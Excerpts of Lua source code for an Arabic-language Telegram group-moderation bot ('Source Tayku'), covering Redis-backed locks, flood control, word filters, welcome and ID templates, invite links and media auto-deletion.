HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevLeo:srem(Tayku..'Rio:Tkeed:'..msg.chat_id_,user) DevLeo:srem(Tayku..'Rio:Ban:'..msg.chat_id_,user) DevLeo:srem(Tayku..'Rio:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevLeo:srem(Tayku..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevLeo:srem(Tayku..'Rio:Ban:'..msg.chat_id_,result.id_) DevLeo:srem(Tayku..'Rio:Muted:'..msg.chat_id_,result.id_) DevLeo:srem(Tayku..'Rio:BanAll:',result.id_) DevLeo:srem(Tayku..'Rio:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevLeo:srem(Tayku..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevLeo:srem(Tayku..'Rio:Ban:'..msg.chat_id_,result.id_) DevLeo:srem(Tayku..'Rio:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
...
DevLeo:set(Tayku.."Rio:GpIds:Text"..msg.chat_id_,Text_Rand)
...
DevLeo:set("Tayku:New:id:"..Tayku..msg.sender_user_id_,'TaykuTeam')
return "TaykuTeam"
end
if text and DevLeo:get("Tayku:New:id:"..Tayku..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevLeo:del("Tayku:New:id:"..Tayku..msg.sender_user_id_)
return false
end
DevLeo:del("Tayku:New:id:"..Tayku..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevLeo:set(Tayku.."Rio:AllIds:Text",text)
return false
end
...
DevLeo:del(Tayku.."Rio:AllIds:Text")
end
end
--     Source Tayku     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙رجائا اتبع التعليمات للتعيين \n᥀︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
DevLeo:set("Tayku:New:id:"..Tayku..msg.chat_id_..msg.sender_user_id_,'TaykuTeam')
return "TaykuTeam"
end
if text and Manager(msg) and DevLeo:get("Tayku:New:id:"..Tayku..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevLeo:del("Tayku:New:id:"..Tayku..msg.chat_id_..msg.sender_user_id_)
return false
end
DevLeo:del("Tayku:New:id:"..Tayku..msg.chat_id_..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الكليشه الجديده', 1, 'md')
DevLeo:set(Tayku.."Rio:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف كليشة الايدي")  
DevLeo:del(Tayku.."Rio:GpIds:Text"..msg.chat_id_)
end
end
--     Source Tayku     --
if msg.reply_to_message_id_ ~= 0 then
...
function TaykuTeam(extra,rio,success)
...
local msgsday = DevLeo:get(Tayku..'Rio:UsersMsgs'..Tayku..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevLeo:get(Tayku..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevLeo:get(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevLeo:get(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevLeo:get(Tayku..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
...
if not DevLeo:get(Tayku..'Rio:Lock:Id'..msg.chat_id_) then 
if not DevLeo:get(Tayku..'Rio:Lock:Id:Photo'..msg.chat_id_) then 
if DevLeo:get(Tayku.."Rio:AllIds:Text") then
newpicid = DevLeo:get(Tayku.."Rio:AllIds:Text")
...
if not DevLeo:get(Tayku.."Rio:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, rio.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevLeo:get(Tayku.."Rio:GpIds:Text"..msg.chat_id_)
...
if DevLeo:get(Tayku.."Rio:AllIds:Text") then
newallid = DevLeo:get(Tayku.."Rio:AllIds:Text")
...
if DevLeo:get(Tayku.."Rio:AllIds:Text") then
notpicid = DevLeo:get(Tayku.."Rio:AllIds:Text")
...
if not DevLeo:get(Tayku..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التعديل")  
DevLeo:set(Tayku..'Rio:Lock:EditMsgs'..msg.chat_id_,true)
else
...
DevLeo:set(Tayku.."Rio:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevLeo:hset(Tayku.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevLeo:hset(Tayku.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
...
DevLeo:hset(Tayku.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevLeo:hset(Tayku.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevLeo:get(Tayku..'Rio:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevLeo:set(Tayku.."Rio:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التثبيت")  
DevLeo:set(Tayku..'Rio:Lock:Pin'..msg.chat_id_,true)
DevLeo:sadd(Tayku.."Rio:Lock:Pinpin",msg.chat_id_) 
else
...
DevLeo:hset(Tayku.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevLeo:hset(Tayku.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevLeo:get(Tayku..'Rio:Lock:Id:Photo'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بالصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Lock:Id:Photo'..msg.chat_id_,true)
end end 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevLeo:get(Tayku..'Rio:Lock:Id'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالتاكيد معطل ', 1, 'md')
else
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source Tayku     --
...
DevLeo:setex(Tayku.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevLeo:get(Tayku.."Rio:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevLeo:set(Tayku.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku.."Rio:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الترحيب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku.."Rio:Lock:Welcome"..msg.chat_id_)
end
if DevLeo:get(Tayku..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevLeo:del(Tayku..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevLeo:del(Tayku..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevLeo:set(Tayku..'Rio:Groups:Welcomes'..msg.chat_id_,Welcomes)
...
DevLeo:set(Tayku..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الترحيب")  
DevLeo:del(Tayku..'Rio:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevLeo:get(Tayku..'Rio:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
...
--     Source Tayku     --
if DevLeo:get(Tayku..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء حفظ الوصف", 1, 'md')
DevLeo:del(Tayku..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevLeo:del(Tayku..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevLeo:set(Tayku..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
DevLeo:set(Tayku.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevLeo:get(Tayku.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر المنع', 1, 'md')
DevLeo:del(Tayku.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم منع الكلمه ↫ "..text, 1, 'html')
DevLeo:del(Tayku.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevLeo:hset(Tayku..'Rio:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الكلمه الان", 1, 'md') 
DevLeo:set(Tayku.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevLeo:get(Tayku.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الغاء المنع', 1, 'md')
DevLeo:del(Tayku.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevLeo:hget(Tayku..'Rio:Filters:'..msg.chat_id_, text) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevLeo:del(Tayku.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevLeo:hdel(Tayku..'Rio:Filters:'..msg.chat_id_, text)
...
local gps = DevLeo:scard(Tayku.."Rio:Groups") local users = DevLeo:scard(Tayku.."Rio:Users") 
...
local users = DevLeo:scard(Tayku.."Rio:Users")
...
local gps = DevLeo:scard(Tayku.."Rio:Groups")
...
if not DevLeo:get(Tayku..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
...
DevLeo:setex(Tayku..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
...
local pv = DevLeo:smembers(Tayku.."Rio:Users")
local sendok = 0
for i = 1, #pv do
...
DevLeo:srem(Tayku.."Rio:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
...
local group = DevLeo:smembers(Tayku.."Rio:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevLeo:srem(Tayku.."Rio:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = Tayku, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
...
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙عدد الكروبات الان ↫ { '..#group..' }'..Taykugp1..Taykugp2..'\n᥀︙العدد الحقيقي الان  ↫ ( '..Taykugp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Lock:CleanNum'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:CleanNum'..msg.chat_id_) 
end
...
DevLeo:set(Tayku..'Rio:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevLeo:get(Tayku..'Rio:Lock:CleanNum'..msg.chat_id_) then
if DevLeo:get(Tayku..'Rio:CleanNum'..msg.chat_id_) then CleanNum = DevLeo:get(Tayku..'Rio:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevLeo:scard(Tayku.."Rio:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevLeo:smembers(Tayku.."Rio:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevLeo:del(Tayku.."Rio:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevLeo:get(Tayku..'Rio:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevLeo:scard(Tayku.."Rio:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد الميديا ↫ "..M.."\n᥀︙الحذف التلقائي ↫ "..(DevLeo:get(Tayku..'Rio:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
...
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevLeo:get(Tayku..'Rio:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevLeo:scard(Tayku.."Rio:cleaner"..msg.chat_id_)
if M ~= 0 then
...
DevLeo:del(Tayku.."Rio:cleaner"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل مسح الاغاني بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevLeo:get(Tayku..'Rio:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevLeo:scard(Tayku.."Rio:cleanermusic"..msg.chat_id_)
if M ~= 0 then
...
local List = DevLeo:smembers(Tayku.."Rio:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevLeo:del(Tayku.."Rio:cleanermusic"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
--     Source Tayku     --
...
if DevLeo:get(Tayku..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التعديل")  
DevLeo:del(Tayku..'Rio:Lock:EditMsgs'..msg.chat_id_)
else
...
DevLeo:del(Tayku.."Rio:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
DevLeo:hdel(Tayku.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevLeo:get(Tayku..'Rio:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التثبيت")  
DevLeo:del(Tayku..'Rio:Lock:Pin'..msg.chat_id_)
DevLeo:srem(Tayku.."Rio:Lock:Pinpin",msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Text'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Photo'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevLeo:get(Tayku..'Rio:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الكلايش")  
DevLeo:del(Tayku..'Rio:Lock:Spam'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Join'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Videos'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Document'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Inline'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Markdown'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Gifs'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Music'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Voice'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Links'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Location'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Tags'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Hashtak'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Contact'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:WebLinks'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Arabic'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:English'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:TagServr'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Stickers'..msg.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Lock:Forwards'..msg.chat_id_)
else
...
DevLeo:set(Tayku.."Rio:Lock:Bots"..msg.chat_id_,"del") DevLeo:hset(Tayku.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Rio:Lock:Links','Rio:Lock:Contact','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks','Rio:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevLeo:set(Tayku..Lock..msg.chat_id_,true)
end
...
DevLeo:del(Tayku..UnLock..msg.chat_id_)
end
...
DevLeo:del(Tayku..'Rio:Lock:Fshar'..msg.chat_id_) DevLeo:del(Tayku..'Rio:Lock:Taf'..msg.chat_id_) DevLeo:del(Tayku..'Rio:Lock:Kfr'..msg.chat_id_) 
DevLeo:set(Tayku.."Rio:Lock:Bots"..msg.chat_id_,"del") DevLeo:hset(Tayku.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
...
DevLeo:set(Tayku..'Rio:Lock:Fshar'..msg.chat_id_,true) DevLeo:set(Tayku..'Rio:Lock:Taf'..msg.chat_id_,true) DevLeo:set(Tayku..'Rio:Lock:Kfr'..msg.chat_id_,true) DevLeo:hdel(Tayku.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
...
DevLeo:set(Tayku..'Rio:Spam:Text'..msg.chat_id_,SetSpam)
...
DevLeo:set(Tayku.."Rio:SudoBot:Rd"..msg.chat_id_,Text)
...
DevLeo:set(Tayku.."Rio:BasicConstructor:Rd"..msg.chat_id_,Text)
...
DevLeo:set(Tayku.."Rio:Constructor:Rd"..msg.chat_id_,Text)
...
DevLeo:set(Tayku.."Rio:Managers:Rd"..msg.chat_id_,Text) 
...
DevLeo:set(Tayku.."Rio:Admins:Rd"..msg.chat_id_,Text)
...
DevLeo:set(Tayku.."Rio:VipMem:Rd"..msg.chat_id_,Text)
...
DevLeo:set(Tayku.."Rio:Cleaner:Rd"..msg.chat_id_,Text)
...
DevLeo:set(Tayku.."Rio:mem:Rd"..msg.chat_id_,Text)
...
DevLeo:del(Tayku.."Rio:mem:Rd"..msg.chat_id_)
DevLeo:del(Tayku.."Rio:Cleaner:Rd"..msg.chat_id_)
DevLeo:del(Tayku.."Rio:VipMem:Rd"..msg.chat_id_)
DevLeo:del(Tayku.."Rio:Admins:Rd"..msg.chat_id_)
DevLeo:del(Tayku.."Rio:Managers:Rd"..msg.chat_id_)
DevLeo:del(Tayku.."Rio:Constructor:Rd"..msg.chat_id_)
DevLeo:del(Tayku.."Rio:BasicConstructor:Rd"..msg.chat_id_)
DevLeo:del(Tayku.."Rio:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source Tayku     --
...
if tonumber(admins[i].user_id_) ~= tonumber(Tayku) then
...
DevLeo:srem(Tayku..'Rio:Tkeed:'..msg.chat_id_, v)
end 
...
DevLeo:del(Tayku..'Rio:Filters:'..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Filters:'..msg.chat_id_)
DevLeo:del(Tayku.."Rio:FilterAnimation"..msg.chat_id_)
DevLeo:del(Tayku.."Rio:FilterPhoto"..msg.chat_id_)
DevLeo:del(Tayku.."Rio:FilterSteckr"..msg.chat_id_)
end
...
DevLeo:del(Tayku..'Rio:Ban:'..msg.chat_id_) DevLeo:del(Tayku..'Rio:Admins:'..msg.chat_id_) DevLeo:del(Tayku..'User:Donky:'..msg.chat_id_) DevLeo:del(Tayku..'Rio:VipMem:'..msg.chat_id_) DevLeo:del(Tayku..'Rio:Filters:'..msg.chat_id_) DevLeo:del(Tayku..'Rio:Muted:'..msg.chat_id_)
...
local basicconstructor = DevLeo:smembers(Tayku..'Rio:BasicConstructor:'..msg.chat_id_)
local constructor = DevLeo:smembers(Tayku..'Rio:Constructor:'..msg.chat_id_)
local Managers = DevLeo:smembers(Tayku..'Rio:Managers:'..msg.chat_id_)
local admins = DevLeo:smembers(Tayku..'Rio:Admins:'..msg.chat_id_)
local vipmem = DevLeo:smembers(Tayku..'Rio:VipMem:'..msg.chat_id_)
local donky = DevLeo:smembers(Tayku..'User:Donky:'..msg.chat_id_)
...
spam_c = DevLeo:get(Tayku..'Rio:Spam:Text'..msg.chat_id_)
end
--     Source Tayku     --
if DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevLeo:hget(Tayku.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source Tayku     --
if DevLeo:get(Tayku.."Rio:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevLeo:get(Tayku.."Rio:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevLeo:get(Tayku.."Rio:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source Tayku     --
if DevLeo:get(Tayku..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevLeo:get(Tayku..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevLeo:get(Tayku..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
